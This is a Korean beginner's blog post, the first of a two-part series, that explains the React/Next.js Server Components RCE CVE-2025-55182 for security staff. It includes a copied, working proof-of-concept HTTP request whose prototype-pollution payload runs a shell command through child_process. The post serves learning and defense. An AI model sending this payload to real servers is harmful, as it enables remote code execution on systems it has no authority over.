+++
title = "12월 2번째 주"
date = "2025-12-11"
description = "React/Next.js RSC RCE 취약점 | CVE-2025-55182 (1)"
+++
{% alert_info() %}
	초보 수준의 이해기를 담은 글입니다.
{% end %}


## 들어가기 앞서
평소와 같이 출근을 하던 김포테이토는 잔뜩 생긴 신규 정책을 둘러보느라 정신이 없습니다. CVSS 10 점을 받고 제 2의 Log4j라느니 뭐니 떠들썩 합니다. 그렇게 중요한 것이라면 공부 해야지! 강한 의욕을 가지고 공식 문서와 기술 블로그를 읽어봅니다. 봐도봐도 무슨 말인지 잘 모르겠습니다. 취약점 공부는 중요하기 때문에 인상을 팍 찌푸리고 억지로 한글자씩 읽어 나갑니다.

```
'RSC 기능을 통해.. RSC? 이게 뭐야.. 역질렬화를.. 청크가.. 뭔데?.. 아니 애초에 이게 뭔 기능을 하던건데.. 
세상 사람들은 React를 다 쓰고 사나봐.. 나만 모르는 거 같은데..'
```
자기들끼리 아는 얘기를 신나게 하고 있습니다. 전혀 이해하지 못하고 이게 뭔지도 모르는 김포테이토는 어색하게 웃으며 주변 동료들에게 끄덕입니다. 그래그래, 정말 위험하다. 와 이런 취약점이! 김포테이토는 뭔지도 모르겠는 NIST 문서를 끄고 이메일을 확인하기로 합니다. 

## 기초부터
### React
React를 처음 검색하면 UI를 만드는데 도움을 주는 JavaScript 라이브러리 라고 합니다. 사실상 이 취약점을 공부하기 위해서 React를 어떻게 쓰는지, Nest.js랑 무슨 차이점이 있고 등등 마치 리액트 학개론 쪽지시험에 나올법한 자세한 내용은 알지 않아도 됩니다. 왜냐하면 보안인인 김포테이토에게는 시간이 한정되어 있기 때문입니다.
1. 사용자 인터페이스를 만들기 위한 JavaScript 라이브러리이다.
2. 컴포넌트 기반이다 (UI를 재사용 및 코드 중복을 줄이고 보수를 용이하게 하기위해)


이정도만 끄덕끄덕 이해하고 넘어갑니다.

### Next.js
Server Side Rendering, 정적 웹 페이지 생성 등 리액트 기반 오픈 소스 웹 개발 프레임워크 입니다. 설명을 읽던 김포테이토는 눈을 깍 감습니다.(김포테이토: 뭔소리여..!!ㅠㅠ) 서버 렌더링과 정적 웹 사이트 생성 부분을 연속해서 읽습니다. 용어가 와닿지 않으니 계속해서 같은 구문을 빙빙 돕니다. (그냥 서버에서 페이지를 만들어서 보내준다고 생각하면 됩니다.)
1. 리액트 기반으로 웹 페이지 뚝딱 따라란~ 을 도와주는 도구다
2. Client Side 가 아닌 Server Side 에서 랜더링을 해주는 녀석이다.

### RSC(React Server Components)
다행히 김포테이토군은 앞선 지식으로 React가 Server 쪽에서 렌더링을 해준다는 것을 배웠습니다. 이름을 보자마자 직관적으로 이해가 가기 시작합니다.
```
아! React가 Server Side Rendering을 하기 위해 처리하고자 하는 Components 구나!
```

직독직해의 냄새가 나지만 이정도면 괜찮습니다. 아무튼, React 에서 웹 구현을 위해 Server와 Client 간 와리가리 하는 '무언가' 입니다. 비슷한 것으로 JSON이 있었습니다. JSON 데이터와 다르게 RSC는 여러 가지 처리가 가능합니다. {key:value} 와 같이 단순한 형태가 아닌, {"결제자":"박대리", "김포테이토":"고민중", "박차장":"김포테이토와 같은 것", "리뷰이벤트":"3번 군만두"} 수준으로 처리가 가능해집니다. 쪼개서 전송을 하면서 응답값 처리가 각자 시간이 다르기 때문에 '뒤에 오는 응답값을 보고서 이거를 해' 라는 사기적인 요청도 가능해집니다. (여기서 Promise, Then 개념이 등장합니다.) 앞서 나온 `청크` 라는 아~주 어려워 보이는 개념은 간단합니다. 이 조각 조각 땃따따 쪼개놓은 것을 청크라고 합니다. React는 RSC를 Flight Protocol을 통해 전달합니다. 그냥 보낼 때 사용하는 독자적인 프로토콜로 자세히 알면 다칩니다.

### 직렬화, 역직렬화
직렬화는 프로그램 내부에서 사용하는 객체, 데이터를 다른 프로그램에 전달해 사용할 수 있도록 바이트 형태로 변환하는 것이고 역직렬화는 당연히 그 반대의 의미를 말합니다. 
1. 모든 프로그램이 (당연하게도) 같은 포맷을 쓰지 않기 때문에 표준 포맷 필요
2. 네트워크로 보내려면 바이트 형태여야함
3. 프로그램에서는 객체가 컴퓨터 내부 포인터 형태라서 그대로 전송 못 함.


중국 지사 왕과장에게 김포테이토가 한국어로 전달할 수 없듯이, 버스에 타고서 앞에서 2번째 좌석으로 짜장면을 배달 시키고 버스에서 내려버리면 짜장면을 받을 수 없듯이, 여러 문제를 해결하기 위해 직렬화는 중요합니다. JavaScript 에서는 `const obj = { name : "potato", age : "90" };` 의 JavaScript 객체를 `{"name":"potato", "age":90}` 형태로 네트워크에 태워 보내는 것입니다.

### Flight Protocol

## 페이로드 훔쳐보기
```
POST / HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36
Next-Action: x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Length: 459

------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"

{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('xcalc');","_formData":{"get":"$1:constructor:constructor"}}}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"

"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```
예의상 이분의 gist git 을 그대로 긁어오고 싶었으나, 저주받은 CSS 설정 상 gist  는 자동 줄바꿈이 되지 않기 때문에 부득이하게 코드 형태로 긁어왔습니다. 출처는 [**이곳**](https://gist.github.com/maple3142/48bc9393f45e068cf8c90ab865c0f5f3#file-cve-2025-55182-http) 입니다. 자 이제 김포테이토는 다시 한 번 페이로드를 읽어봅니다. 처음 `Next-Action` 과 `multipart` 가 보입니다. `Next-Action` 은 React/Next.js 실행 시 RSC의 서버 함수 호출을 부르기 위한 커스텀 헤더입니다. 이 부분이 꼭 존재해야만 RSC 처리로 전달됩니다. `multipart` 는 조각 조각 따따따 (여러개의 청크로 이루어 졌다는 뜻) 하여 전송한다는 뜻으로 사용되었습니다. 바디 값부터 엄청나게 중요한 부분이 나옵니다.

`Content-Disposition: form-data; name="0"` 에서 name="0" 이라는 특이한 부분이 눈에 띕니다. 해당 부분은 청크 ID로 0번째 조각 이라는 뜻입니다. 첫 번째 조각을 정리하면 다음과 같습니다.
```
{"then":"$1:__proto__:then",
"status":"resolved_model",
"reason":-1,
"value":"{\"then\":\"$B1337\"}",
"_response":{"_prefix":"process.mainModule.require('child_process').execSync('xcalc');",
"_formData":{"get":"$1:constructor:constructor"}}}
```
then 이 보입니다. 이것은 앞서 회사 점심메뉴 주문에서 스쳐가듯 나온 부분입니다. 여기서 thenable 이라는 아주 중요한 개념이 등장합니다. (김포테이토: 그만나와!!) 하지만 보안인의 시간은 늘 없기 때문에 간단하게 설명 하자면, `then() 이 되는 것` 입니다.(한때 유행했던 0블리랑 비슷한 느낌이 듭니다.) Flight 프로토콜은 thenable 객체를 특별하게 처리하기 때문에 사실상 `"_response"` 구문 전까지 최대한 then 이 있는 것처럼 잔뜩 깃털을 부풀린 모습입니다. 


{% alert_info(style="outline") %}
  글이 점점 길어져 부득이하게 1과 2로 나누겠습니다. (계속해서 새로운 정보가 업데이트 되더라구요;)
{% end %}